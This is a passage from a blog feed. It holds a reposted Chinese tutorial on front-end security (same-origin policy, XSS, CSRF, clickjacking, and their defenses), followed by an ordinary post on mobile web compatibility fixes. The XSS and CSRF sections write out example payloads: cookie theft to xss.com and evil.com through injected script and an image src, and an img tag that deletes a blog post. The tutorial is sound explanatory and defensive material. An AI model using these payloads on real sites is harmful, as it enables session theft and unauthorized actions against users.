    <published>2018-08-10T02:32:54.000Z</published>
    <updated>2018-08-10T04:06:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>转自：<a href="https://cloud.tencent.com/developer/article/1136202" rel="external nofollow noopener noreferrer" target="_blank">https://cloud.tencent.com/developer/article/1136202</a></p><h1 id="安全问题的分类"><a href="#安全问题的分类" class="headerlink" title="安全问题的分类"></a>安全问题的分类</h1><h2 id="按照所发生的区域分类"><a href="#按照所发生的区域分类" class="headerlink" title="按照所发生的区域分类"></a>按照所发生的区域分类</h2><ul><li>后端安全问题：所有发生在后端服务器、应用、服务当中的安全问题</li><li>前端安全问题：所有发生在浏览器、单页面应用、Web 页面当中的安全问题</li></ul><h2 id="按照团队中哪个角色最适合来修复安全问题分类"><a href="#按照团队中哪个角色最适合来修复安全问题分类" class="headerlink" title="按照团队中哪个角色最适合来修复安全问题分类"></a>按照团队中哪个角色最适合来修复安全问题分类</h2><ul><li>后端安全问题：针对这个安全问题，后端最适合来修复</li><li>前端安全问题：针对这个安全问题，前端最适合来修复</li></ul><h2 id="综合以上"><a href="#综合以上" class="headerlink" title="综合以上"></a>综合以上</h2><ul><li>前端安全问题：发生在浏览器、前端应用当中或者通常由前端开发工程师来对其进行修复的安全问题<a id="more"></a></li></ul><h2 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h2><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><blockquote><p>是一种约定，是浏览器最核心也最基本的安全功能，限制了来自不同源的 document 或者脚本，对当前 document 读取或设置某些属性</p></blockquote><p><img src="/images/2018/08/iidyq95w48.png" alt=""></p><ul><li>影响 “源” 的因素有：host（域名或者 IP 地址）、子域名、端口、协议</li><li>对浏览器来说，DOM、Cookie、XMLHttpRequest 会受到同源策略的限制</li></ul><h4 id="不受同源策略的标签"><a href="#不受同源策略的标签" class="headerlink" title="不受同源策略的标签"></a>不受同源策略的标签</h4><p><code>&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;、&lt;link&gt;</code> 等标签都可以跨域加载资源，而不受同源策略的限制</p><ul><li>这些带 “src” 属性的标签每次加载时，浏览器会发起一次 GET 请求</li><li>通过 src 属性加载的资源，浏览器限制了 javascript 的权限，使其不能读、写返回的内容</li></ul><h1 id="三大前端安全问题"><a href="#三大前端安全问题" class="headerlink" title="三大前端安全问题"></a>三大前端安全问题</h1><h2 id="1、跨站脚本攻击（XSS）"><a href="#1、跨站脚本攻击（XSS）" class="headerlink" title="1、跨站脚本攻击（XSS）"></a>1、跨站脚本攻击（XSS）</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><blockquote><p>英文全称：Cross Site Script，XSS 攻击，通常指黑客通过 “HTML 注入” 篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击</p></blockquote><h3 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h3><p>是一种“HTML 注入”，用户的数据被当成了 HTML 代码一部分来执行，从而产生了新的语义</p><hr><h3 id="XSS-的分类"><a href="#XSS-的分类" class="headerlink" title="XSS 的分类"></a>XSS 的分类</h3><h4 id="1、反射型-XSS：将用户输入的数据反射给浏览器。黑客需要诱使用户-“点击”-一个恶意链接，才能攻击成功。"><a href="#1、反射型-XSS：将用户输入的数据反射给浏览器。黑客需要诱使用户-“点击”-一个恶意链接，才能攻击成功。" class="headerlink" title="1、反射型 XSS：将用户输入的数据反射给浏览器。黑客需要诱使用户 “点击” 一个恶意链接，才能攻击成功。"></a>1、反射型 XSS：将用户输入的数据反射给浏览器。黑客需要诱使用户 “点击” 一个恶意链接，才能攻击成功。</h4><p>举个例子：  </p><ol><li>假设在某购物网站上搜商品，当搜不到商品时会出现<br><img src="/images/2018/08/ow7pa2xmka.png" alt=""></li></ol><p>此时的 URL 是 <code>https://category.vip.com/suggest.php?keyword=xss&amp;ff=235|12|1|1</code></p><ol><li>在搜索框输入 <code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>  </li><li>如果前端页面没有对搜索框的内容进行过滤，而是直接发送，这时，URL 地址栏应该会显示 <code>https://category.vip.com/suggest.php?keyword=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&amp;ff=235|12|1|1</code>，从而 alert 出 xss，但事实却是已经转码了的：<code>https://category.vip.com/suggest.php?keyword=%3Cscript%3Ealert(%27xss%27)%3C%2Fscript%3E&amp;ff=235|12|1|1</code>  </li><li>假设前端页面没有进行处理，那么攻击者就可以通过构造来获取用户的 cookie 的地址，来诱使用户来访问这个地址，比如说 <code>https://category.vip.com/suggest.php?keyword=&lt;script&gt;document.location=&#39;http://xss.com/get?cookie=&#39;+document.cookie&lt;/script&gt;&amp;ff=235|12|1|1</code>  </li></ol><h4 id="2、存储型-XSS：把用户输入的数据-“存储”-在服务器端，这种-XSS-具有很强的稳定性。"><a href="#2、存储型-XSS：把用户输入的数据-“存储”-在服务器端，这种-XSS-具有很强的稳定性。" class="headerlink" title="2、存储型 XSS：把用户输入的数据 “存储” 在服务器端，这种 XSS 具有很强的稳定性。"></a>2、存储型 XSS：把用户输入的数据 “存储” 在服务器端，这种 XSS 具有很强的稳定性。</h4><p>比如说，黑客写下一篇包含恶意 javascript 代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在浏览器中执行这段恶意的 javascript 代码，黑客把恶意的脚本保存到服务器端</p><h4 id="3、DOM-Based-XSS：通过修改页面的-DOM-节点形成的-XSS。"><a href="#3、DOM-Based-XSS：通过修改页面的-DOM-节点形成的-XSS。" class="headerlink" title="3、DOM Based XSS：通过修改页面的 DOM 节点形成的 XSS。"></a>3、DOM Based XSS：通过修改页面的 DOM 节点形成的 XSS。</h4><p>举个例子：<br><img src="/images/2018/08/y3gm5kihsj.png" alt=""></p><ol><li><p>在输入框中输入内容后点击 write<br><img src="/images/2018/08/cc8ci5vca3.png" alt=""></p></li><li><p>此时再点击 a 链接<br><img src="/images/2018/08/fsrymnkp3k.png" alt=""></p></li></ol><p><strong> 原理：</strong> 首先用一个单引号闭合掉 href 的第一个单引号，然后插入一个 onclick 事件，最后再用注释符 “//“ 注释掉第二个单引号。点击此链接，脚本将被执行。</p><hr><h3 id="XSS-Payload-攻击"><a href="#XSS-Payload-攻击" class="headerlink" title="XSS Payload 攻击"></a>XSS Payload 攻击</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><blockquote><p>XSS 攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用以完成各种具体功能的恶意脚本，被称为 XSS Payload。实际上就是 Javascript 脚本（或者 Flash 或其他富客户端的脚本），所以 XSS Payload 能够做到任何 javascript 脚本能实现的功能</p></blockquote><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><ul><li>通过读取浏览器的 cookie 对象，从而发起 “cookie 劫持” 攻击</li></ul><ol><li>攻击者首先加载一个远程脚本 <code>http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</code></li><li>真正的 XSS Payload 写在这个远程脚本中，避免直接在 URL 的参数里写入大量的 Javascript 代码</li><li>在 evil.js 中，通过如下代码窃取 cookie <code>var img = document.createElement(&quot;img&quot;);</code></li><li><code>img.src = &quot;http://www.evil.com/log?&quot;+escape(document.cookie);</code></li><li><code>document.body.appendChild(img);</code></li><li>以上代码在页面中插入了一张看不见的图片，同时把 document.cookie 对象作为参数发送到远程服务器中</li><li><a href="http://www.evil.com/log" rel="external nofollow noopener noreferrer" target="_blank">http://www.evil.com/log</a> 并不一定要存在，因为这个请求会在远程服务器的 Web 日志中留下记录 <code>127.0.0.1 - - [119/Jul/2010:11:30:42 + 0800] &quot;GET /log?cookie1%3D1234 HTTP/1.1&quot; 404 288</code></li></ol><ul><li>通过模拟 GET、POST 请求操作用户的浏览器（在 “cookie 劫持” 失效时，或者目标用户的网络不能访问互联网等情况时会非常有用）<ol><li>假设某博客页面存在 XSS 漏洞，那么可以通过构造 get 请求操作用户浏览器  </li><li>假设正常删除博客文章的链接为 <code>http://blog.test.com/manage/entry.do?m=delete&amp;id=1245862</code></li><li>对于攻击者来说，只需要知道文章的 id，就能够通过这个请求来删除这篇文章</li><li>攻击者可以通过插入一张图片来发起一个 get 请求<br><img src="/images/2018/08/lzkcgzju99.png" alt="">  </li><li>攻击者只需要让博客作者执行这段 javascript 代码也就是 XSS Payload，就会删除这篇文章</li></ol></li></ul><hr><h3 id="XSS-的防御"><a href="#XSS-的防御" class="headerlink" title="XSS 的防御"></a>XSS 的防御</h3><h4 id="1、HttpOnly"><a href="#1、HttpOnly" class="headerlink" title="1、HttpOnly"></a>1、HttpOnly</h4><blockquote><p>浏览器禁止页面的 Javascript 访问带有 HttpOnly 属性的 cookie。（实质解决的是：XSS 后的 cookie 劫持攻击）如今已成为一种 “标准” 的做法</p></blockquote><p>不同语言给 cookie 添加 HttpOnly 的方式不同，比如</p><ul><li>JavaEE：<code>response.setHeader(&quot;Set-Cookie&quot;,&quot;cookiename=value; Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly&quot;);</code></li><li>PHP4：<code>header(&quot;Set-Cookie:hidden=value;httpOnly&quot;);</code></li><li>PHP5：<code>setcookie(&quot;abc&quot;,&quot;test&quot;,NULL,NULL,NULL,NULL,TRUE);     //true 为 HttpOnly 属性</code></li></ul><h4 id="2、输入检查（XSS-Filter）"><a href="#2、输入检查（XSS-Filter）" class="headerlink" title="2、输入检查（XSS Filter）"></a>2、输入检查（XSS Filter）</h4><ul><li>原理：让一些基于特殊字符的攻击失效。（常见的 Web 漏洞如 XSS、SQLInjection 等，都要求攻击者构造一些特殊字符）</li><li>输入检查的逻辑，必须放在服务器端代码中实现。<em><strong>* 目前 Web 开发的普遍做法，是同时哎客户端 Javascript 中和服务端代码中实现相同的输入检查。客户端的输入检查可以阻挡大部分误操作的正常用户，节约服务器资源。</strong></em></li></ul><h4 id="3、输出检查"><a href="#3、输出检查" class="headerlink" title="3、输出检查"></a>3、输出检查</h4><blockquote><p>在变量输出到 HTML 页面时，使用编码或转义的方式来防御 XSS 攻击</p></blockquote><ul><li>针对 HTML 代码的编码方式：HtmlEncode</li><li>PHP：htmlentities()和 htmlspecialchars()两个函数</li><li>Javascript：JavascriptEncode（需要使用 “\” 对特殊字符进行转义，同时要求输出的变量必须在引号内部）</li><li>在 URL 的 path（路径）或者 search（参数）中输出，使用 URLEncode<br>具体实施可以参考：<a href="http://www.cnblogs.com/lovesong/p/5211667.html" rel="external nofollow noopener noreferrer" target="_blank">http://www.cnblogs.com/lovesong/p/5211667.html</a></li></ul><hr><h3 id="防御-DOM-Based-XSS"><a href="#防御-DOM-Based-XSS" class="headerlink" title="防御 DOM Based XSS"></a>防御 DOM Based XSS</h3><ul><li><strong>DOM Based XSS 的形成：</strong> （举个例子）<br><img src="/images/2018/08/g7y4enjbig.png" alt=""></li><li><strong> 实质：</strong> 从 Javascript 中输出数据到 HTML 页面里</li><li><strong> 这个例子的解决方案：</strong> 做一次 HtmlEncode</li></ul><p><strong> 防御方法：分语境使用不同的编码函数 </strong></p><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>XSS 漏洞虽然复杂，但是却是可以彻底解决的。在设计解决方案时，应该针对不同场景理解 XSS 攻击的原理，使用不同的方法 </strong></p><h2 id="2、CSRF（跨站点请求伪造）"><a href="#2、CSRF（跨站点请求伪造）" class="headerlink" title="2、CSRF（跨站点请求伪造）"></a>2、CSRF（跨站点请求伪造）</h2><h3 id="什么是-CSRF"><a href="#什么是-CSRF" class="headerlink" title="什么是 CSRF"></a>什么是 CSRF</h3><p>首先来看个例子：  </p><blockquote><p>攻击者首先在自己的域构造一个页面：<code>http://www.a.com/csrf.html</code>，其内容为 <code>&lt;img src=&quot;http://blog.sohu.com/manage/entry.do?m=deleted&amp;id=156714243&quot; /&gt;</code><br>使用了一个 img 标签，其地址指向了删除 Iid 为 156714243 的博客文章<br>然后攻击者诱使目标用户，也就是博客主人访问这个页面<br>用户进去看到一张无法显示的图片，这时自己的那篇博客文章已经被删除了</p></blockquote><p><strong> 原理：</strong> 在刚才访问 <code>http://www.a.com/csrf.html</code> 页面时，图片标签向服务器发送了一次 get 请求，这次请求导致了博客文章被删除</p><p><strong><em>这种删除博客文章的请求，是攻击者伪造的，所以这种攻击就叫做“跨站点请求伪造”</em></strong></p><h3 id="CSRF-的原理"><a href="#CSRF-的原理" class="headerlink" title="CSRF 的原理"></a>CSRF 的原理</h3><p><img src="/images/2018/08/42jy9nsxn5.jpeg" alt=""></p><p>参考上图，我们可以总结，完成一次 CSRF 攻击，必须满足两个条件</p><ol><li>用户登录受信任网站 A，并且在本地生成 Cookie</li><li>在不登出网站 A 的情况下，访问危险网站 B</li></ol><h4 id="CSRF-本质"><a href="#CSRF-本质" class="headerlink" title="CSRF 本质"></a>CSRF 本质</h4><blockquote><p>CSRF 攻击是攻击者利用用户身份操作用户账户的一种攻击方式</p></blockquote><h3 id="CSRF-的防御"><a href="#CSRF-的防御" class="headerlink" title="CSRF 的防御"></a>CSRF 的防御</h3><p><strong>CSRF 能攻击成功的本质原因：</strong> 重要操作的所有参数都是可以被攻击者猜测到的</p><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><h5 id="1、验证码"><a href="#1、验证码" class="headerlink" title="1、验证码"></a>1、验证码</h5><p>CSRF 攻击过程中，用户在不知情的情况下构造了网络请求，添加验证码后，强制用户必须与应用进行交互  </p><ul><li>优点：简洁而有效</li><li>缺点：网站不能给所有的操作都加上验证码</li></ul><h5 id="2、Referer-Check"><a href="#2、Referer-Check" class="headerlink" title="2、Referer Check"></a>2、Referer Check</h5><blockquote><p>利用 HTTP 头中的 Referer 判断请求来源是否合法<br>Referer 首部包含了当前请求页面的来源页面的地址</p></blockquote><ul><li>优点：简单易操作（只需要在最后给所有安全敏感的请求统一添加一个拦截器来检查 Referer 的值就行）</li><li><p>缺点：服务器并非什么时候都能取到 Referer</p><ol><li>很多出于保护用户隐私的考虑，限制了 Referer 的发送。</li><li>比如从 HTTPS 跳转到 HTTP，出于安全的考虑，浏览器不会发送 Referer</li></ol></li></ul><p><strong> 浏览器兼容性 </strong><br><img src="/images/2018/08/d4nntcmp9f.png" alt=""></p><p>关于 Referer 的更多详细资料：<a href="https://75team.com/post/everything-you-could-ever-want-to-know-and-more-about-controlling-the-referer-header-fastmail-blog.html" rel="external nofollow noopener noreferrer" target="_blank">https://75team.com/post/everything-you-could-ever-want-to-know-and-more-about-controlling-the-referer-header-fastmail-blog.html</a></p><h5 id="3、使用-Anti-CSRF-Token"><a href="#3、使用-Anti-CSRF-Token" class="headerlink" title="3、使用 Anti CSRF Token"></a>3、使用 Anti CSRF Token</h5><ul><li>比如一个删除操作的 URL 是：<code>http://host/path/delete?uesrname=abc&amp;item=123</code></li><li>保持原参数不变，新增一个参数 Token，Token 值是随机的，不可预测</li><li><code>http://host/path/delete?username=abc&amp;item=123&amp;token=[random(seed)]</code>  </li></ul><p><strong><em>由于 Token 的存在，攻击者无法再构造出一个完整的 URL 实施 CSRF 攻击</em></strong></p><ul><li>优点：比检查 Referer 方法更安全，并且不涉及用户隐私</li><li>缺点：对所有的请求都添加 Token 比较困难</li></ul><p>更多关于 CSRF 详细可参考：  </p><ol><li>CSRF 攻击的应对之道：<a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/" rel="external nofollow noopener noreferrer" target="_blank">https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/</a></li><li>CSRF 原理剖析：<a href="http://netsecurity.51cto.com/art/200812/102951.htm" rel="external nofollow noopener noreferrer" target="_blank">http://netsecurity.51cto.com/art/200812/102951.htm</a></li><li>维基百科 CSRF：<a href="https://en.wikipedia.org/wiki/Cross-site_request_forgery" rel="external nofollow noopener noreferrer" target="_blank">https://en.wikipedia.org/wiki/Cross-site_request_forgery</a></li><li>CSRF 实例：<a href="http://netsecurity.51cto.com/art/200812/102925.htm" rel="external nofollow noopener noreferrer" target="_blank">http://netsecurity.51cto.com/art/200812/102925.htm</a></li></ol><p><strong> 需要注意的点：</strong> </p><ol><li>Token 需要足够随机，必须用足够安全的随机数生成算法</li><li>Token 应该为用户和服务器所共同持有，不能被第三方知晓</li><li>Token 可以放在用户的 Session 或者浏览器的 Cookie 中</li><li>尽量把 Token 放在表单中，把敏感操作由 GET 改为 POST，以 form 表单的形式提交，可以避免 Token 泄露（比如一个页面：<code>http://host/path/manage?username=abc&amp;token=[random]</code>，在此页面用户需要在这个页面提交表单或者单击 “删除” 按钮，才能完成删除操作，在这种场景下，如果这个页面包含了一张攻击者能指定地址的图片 <code>&lt;img src=&quot;http://evil.com/notexist&quot; /&gt;</code>，则这个页面地址会作为 HTTP 请求的 Refer 发送到 evil.com 的服务器上，从而导致 Token 泄露）</li></ol><hr><h3 id="XSRF-攻击"><a href="#XSRF-攻击" class="headerlink" title="XSRF 攻击"></a>XSRF 攻击</h3><blockquote><p>当网站同时存在 XSS 和 CSRF 漏洞时，XSS 可以模拟客户端浏览器执行任意操作，在 XSS 攻击下，攻击者完全可以请求页面后，读取页面内容中的 Token 值，然后再构造出一个合法的请求</p></blockquote><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p><strong> 安全防御的体系应该是相辅相成、缺一不可的 </strong></p><h2 id="3、点击劫持（ClickJacking）"><a href="#3、点击劫持（ClickJacking）" class="headerlink" title="3、点击劫持（ClickJacking）"></a>3、点击劫持（ClickJacking）</h2><h3 id="什么是点击劫持"><a href="#什么是点击劫持" class="headerlink" title="什么是点击劫持"></a>什么是点击劫持</h3><blockquote><p>点击劫持是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的 iframe，覆盖在一个网页上，然后诱使用户在网页上进行操作，此时用户将在不知情的情况下点击透明的 iframe 页面。通过调整 iframe 页面的位置，可以诱使用户恰好点击在 iframe 页面的一些功能性按钮上。</p></blockquote><h3 id="防御点击劫持：X-Frame-Options"><a href="#防御点击劫持：X-Frame-Options" class="headerlink" title="防御点击劫持：X-Frame-Options"></a>防御点击劫持：X-Frame-Options</h3><p>X-Frame-Options HTTP 响应头是用来给浏览器指示允许一个页面能否在 <code>&lt;frame&gt;、&lt;iframe&gt;、&lt;object&gt;</code> 中展现的标记</p><h3 id="有三个可选的值"><a href="#有三个可选的值" class="headerlink" title="有三个可选的值"></a>有三个可选的值</h3><ol><li>DENY：浏览器会拒绝当前页面加载任何 frame 页面（即使是相同域名的页面也不允许）</li><li>SAMEORIGIN：允许加载 frame 页面，但是 frame 页面的地址只能为同源域名下的页面</li><li>ALLOW-FROM：可以加载指定来源的 frame 页面（可以定义 frame 页面的地址）</li></ol><p><strong> 浏览器的兼容性 </strong><br><img src="/images/2018/08/wj8yquphly.png" alt=""></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><strong> 综合以上三大前端安全，我们可以总结 </strong></p><ol><li>谨慎用户输入信息，进行输入检查（客户端和服务端同时检查）</li><li>在变量输出到 HTML 页面时，都应该进行编码或转义来预防 XSS 攻击</li><li>该用验证码的时候一定要添上</li><li>尽量在重要请求上添加 Token 参数，注意 Token 要足够随机，用足够安全的随机数生成算法</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;转自：&lt;a href=&quot;https://cloud.tencent.com/developer/article/1136202&quot; rel=&quot;external nofollow noopener noreferrer&quot; target=&quot;_blank&quot;&gt;https://cloud.tencent.com/developer/article/1136202&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;安全问题的分类&quot;&gt;&lt;a href=&quot;#安全问题的分类&quot; class=&quot;headerlink&quot; title=&quot;安全问题的分类&quot;&gt;&lt;/a&gt;安全问题的分类&lt;/h1&gt;&lt;h2 id=&quot;按照所发生的区域分类&quot;&gt;&lt;a href=&quot;#按照所发生的区域分类&quot; class=&quot;headerlink&quot; title=&quot;按照所发生的区域分类&quot;&gt;&lt;/a&gt;按照所发生的区域分类&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;后端安全问题：所有发生在后端服务器、应用、服务当中的安全问题&lt;/li&gt;
&lt;li&gt;前端安全问题：所有发生在浏览器、单页面应用、Web 页面当中的安全问题&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;按照团队中哪个角色最适合来修复安全问题分类&quot;&gt;&lt;a href=&quot;#按照团队中哪个角色最适合来修复安全问题分类&quot; class=&quot;headerlink&quot; title=&quot;按照团队中哪个角色最适合来修复安全问题分类&quot;&gt;&lt;/a&gt;按照团队中哪个角色最适合来修复安全问题分类&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;后端安全问题：针对这个安全问题，后端最适合来修复&lt;/li&gt;
&lt;li&gt;前端安全问题：针对这个安全问题，前端最适合来修复&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;综合以上&quot;&gt;&lt;a href=&quot;#综合以上&quot; class=&quot;headerlink&quot; title=&quot;综合以上&quot;&gt;&lt;/a&gt;综合以上&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;前端安全问题：发生在浏览器、前端应用当中或者通常由前端开发工程师来对其进行修复的安全问题
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="javascript" scheme="https://hexo.bangz.me/tags/javascript/"/>
    
      <category term="前端" scheme="https://hexo.bangz.me/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="ECMAScript" scheme="https://hexo.bangz.me/tags/ECMAScript/"/>
    
  </entry>
  
  <entry>
    <title>移动端常见兼容性问题及解决方案</title>
    <link href="https://hexo.bangz.me/archives/mobile-web-capabiltiy-faq.html"/>
    <id>https://hexo.bangz.me/archives/mobile-web-capabiltiy-faq.html</id>
    <published>2018-08-07T08:26:09.000Z</published>
    <updated>2018-08-07T08:36:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>文章转自：<a href="https://zhuanlan.zhihu.com/p/28206065" rel="external nofollow noopener noreferrer" target="_blank">常见移动端兼容性问题</a></p><h2 id="1-IOS-移动端-click-事件-300ms-的延迟相应"><a href="#1-IOS-移动端-click-事件-300ms-的延迟相应" class="headerlink" title="1. IOS 移动端 click 事件 300ms 的延迟相应"></a>1. IOS 移动端 click 事件 300ms 的延迟相应</h2><p>移动设备上的 web 网页是有 300ms 延迟的，往往会造成按钮点击延迟甚至是点击失效。</p><p>这是由于区分单机事件和双击屏幕缩放的历史原因造成的。<br><a id="more"></a></p><p>解决方式：</p><ul><li>fastclick 可以解决在手机上点击事件的 300ms 延迟</li><li>zepto 的 touch 模块，tap 事件也是为了解决在 click 的延迟问题</li><li>触摸屏的相应顺序为 touchstart–&gt;touchmove–&gt;touchend–&gt;click，也可以通过绑定 ontouchstart 事件，加快事件的响应，解决 300ms 的延迟问题</li></ul><h2 id="2-一些情况下对非可点击元素（label，span）监听-click-事件，iOS-下不会触发"><a href="#2-一些情况下对非可点击元素（label，span）监听-click-事件，iOS-下不会触发" class="headerlink" title="2. 一些情况下对非可点击元素（label，span）监听 click 事件，iOS 下不会触发"></a>2. 一些情况下对非可点击元素（label，span）监听 click 事件，iOS 下不会触发</h2><p>css 增加 cursor：pointer 就搞定了。  </p><h2 id="3-h5-底部输入框被键盘遮挡问题"><a href="#3-h5-底部输入框被键盘遮挡问题" class="headerlink" title="3. h5 底部输入框被键盘遮挡问题"></a>3. h5 底部输入框被键盘遮挡问题</h2><p>h5 页面有个很蛋疼的问题就是，当输入框在最底部，点击软键盘后输入框会被遮挡。可采用如下方式解决</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> oHeight = $(<span class="built_in">document</span>).height(); <span class="comment">// 浏览器当前的高度 </span></span><br><span class="line">$(<span class="built_in">window</span>).resize(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ($(<span class="built_in">document</span>).height() &lt; oHeight) &#123;</span><br><span class="line">    $(<span class="string">"#footer"</span>).css(<span class="string">"position"</span>,<span class="string">"static"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $(<span class="string">"#footer"</span>).css(<span class="string">"position"</span>,<span class="string">"absolute"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="4-不让-Android-手机识别邮箱"><a href="#4-不让-Android-手机识别邮箱" class="headerlink" title="4. 不让 Android 手机识别邮箱"></a>4. 不让 Android 手机识别邮箱</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"email=no"</span> <span class="attr">name</span>=<span class="string">"format-detection"</span> /&gt;</span></span><br></pre></td></tr></table></figure><h2 id="5-禁止-iOS-识别长串数字为电话"><a href="#5-禁止-iOS-识别长串数字为电话" class="headerlink" title="5. 禁止 iOS 识别长串数字为电话"></a>5. 禁止 iOS 识别长串数字为电话</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"telephone=no"</span> <span class="attr">name</span>=<span class="string">"format-detection"</span> /&gt;</span></span><br></pre></td></tr></table></figure><h2 id="6-禁止-iOS-弹出各种操作窗口"><a href="#6-禁止-iOS-弹出各种操作窗口" class="headerlink" title="6. 禁止 iOS 弹出各种操作窗口"></a>6. 禁止 iOS 弹出各种操作窗口</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">-webkit-touch-callout</span><span class="selector-pseudo">:none</span></span><br></pre></td></tr></table></figure><h2 id="7-消除-transition-闪屏"><a href="#7-消除-transition-闪屏" class="headerlink" title="7. 消除 transition 闪屏"></a>7. 消除 transition 闪屏</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">-webkit-transform-style</span>: <span class="selector-tag">preserve-3d</span>;     <span class="comment">/* 设置内嵌的元素在 3D 空间如何呈现：保留 3D*/</span></span><br><span class="line"><span class="selector-tag">-webkit-backface-visibility</span>: <span class="selector-tag">hidden</span>;      <span class="comment">/*(设置进行转换的元素的背面在面对用户时是否可见：隐藏)*/</span></span><br></pre></td></tr></table></figure><h2 id="8-iOS-系统中文输入法输入英文时，字母之间可能会出现一个六分之一空格"><a href="#8-iOS-系统中文输入法输入英文时，字母之间可能会出现一个六分之一空格" class="headerlink" title="8. iOS 系统中文输入法输入英文时，字母之间可能会出现一个六分之一空格"></a>8. iOS 系统中文输入法输入英文时，字母之间可能会出现一个六分之一空格</h2><p>可以通过正则去掉</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.value = <span class="keyword">this</span>.value.replace(<span class="regexp">/\u2006/g</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure><h2 id="9-禁止-ios-和-android-用户选中文字"><a href="#9-禁止-ios-和-android-用户选中文字" class="headerlink" title="9. 禁止 ios 和 android 用户选中文字"></a>9. 禁止 ios 和 android 用户选中文字</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">-webkit-user-select</span><span class="selector-pseudo">:none</span></span><br></pre></td></tr></table></figure><h2 id="10-CSS-动画页面闪白-动画卡顿"><a href="#10-CSS-动画页面闪白-动画卡顿" class="headerlink" title="10. CSS 动画页面闪白, 动画卡顿"></a>10. CSS 动画页面闪白, 动画卡顿</h2><p>解决方法:</p><ol><li>尽可能地使用合成属性 transform 和 opacity 来设计 CSS3 动画，不使用 position 的 left 和 top 来定位</li><li>开启硬件加速</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">-webkit-transform</span>: <span class="selector-tag">translate3d</span>(0, 0, 0);</span><br><span class="line">   <span class="selector-tag">-moz-transform</span>: <span class="selector-tag">translate3d</span>(0, 0, 0);</span><br><span class="line">    <span class="selector-tag">-ms-transform</span>: <span class="selector-tag">translate3d</span>(0, 0, 0);</span><br><span class="line">        <span class="selector-tag">transform</span>: <span class="selector-tag">translate3d</span>(0, 0, 0);</span><br></pre></td></tr></table></figure><h2 id="11-fixed-定位缺陷"><a href="#11-fixed-定位缺陷" class="headerlink" title="11. fixed 定位缺陷"></a>11. fixed 定位缺陷</h2><ul><li>ios 下 fixed 元素容易定位出错，软键盘弹出时，影响 fixed 元素定位</li><li>android 下 fixed 表现要比 iOS 更好，软键盘弹出时，不会影响 fixed 元素定位</li><li>ios4 下不支持 position:fixed</li><li>解决方案：可用 iScroll 插件解决这个问题</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文章转自：&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28206065&quot; rel=&quot;external nofollow noopener noreferrer&quot; target=&quot;_blank&quot;&gt;常见移动端兼容性问题&lt;/a&gt;&lt;/p&gt;
